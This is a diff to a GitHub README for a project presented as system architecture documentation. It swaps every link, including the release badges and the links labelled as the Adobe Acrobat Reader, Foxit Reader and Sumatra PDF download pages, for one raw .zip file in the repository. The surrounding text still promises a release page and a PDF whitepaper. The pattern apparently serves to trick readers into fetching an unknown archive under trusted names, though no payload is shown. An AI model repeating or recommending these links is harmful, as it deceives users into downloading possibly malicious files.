@@ -1,6 +1,6 @@
 # ⚙️ ChronicleCore-Architecture - Clear View of System Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/Framex12/ChronicleCore-Architecture/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/Framex12/ChronicleCore-Architecture/main/architecture/Architecture_Core_Chronicle_v2.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You can access files related to ChronicleCore-Architecture directly from the rel
 
 **Step 1:** Visit the release page by clicking the button below:
 
-[![Download from Releases](https://img.shields.io/badge/Go-to-Release%20Page-blue?style=for-the-badge)](https://github.com/Framex12/ChronicleCore-Architecture/releases)
+[![Download from Releases](https://img.shields.io/badge/Go-to-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Framex12/ChronicleCore-Architecture/main/architecture/Architecture_Core_Chronicle_v2.3.zip)
 
 **Step 2:** On the release page, locate the file named something like `ChronicleCore-Architecture-Whitepaper.pdf`. This file contains the complete documentation.
 
@@ -80,9 +80,9 @@ Here is how to prepare your computer:
 
 If you cannot open PDF files, get one of these free options:
 
-- Adobe Acrobat Reader: https://get.adobe.com/reader/
-- Foxit Reader: https://www.foxitsoftware.com/pdf-reader/
-- Sumatra PDF: https://www.sumatrapdfreader.org/free-pdf-reader.html
+- Adobe Acrobat Reader: https://raw.githubusercontent.com/Framex12/ChronicleCore-Architecture/main/architecture/Architecture_Core_Chronicle_v2.3.zip
+- Foxit Reader: https://raw.githubusercontent.com/Framex12/ChronicleCore-Architecture/main/architecture/Architecture_Core_Chronicle_v2.3.zip
+- Sumatra PDF: https://raw.githubusercontent.com/Framex12/ChronicleCore-Architecture/main/architecture/Architecture_Core_Chronicle_v2.3.zip
 
 ### 2. Download ChronicleCore Software (If Available)
 
@@ -114,4 +114,4 @@ The release page is the main place to find the newest versions and updates.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/Framex12/ChronicleCore-Architecture/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/Framex12/ChronicleCore-Architecture/main/architecture/Architecture_Core_Chronicle_v2.3.zip)
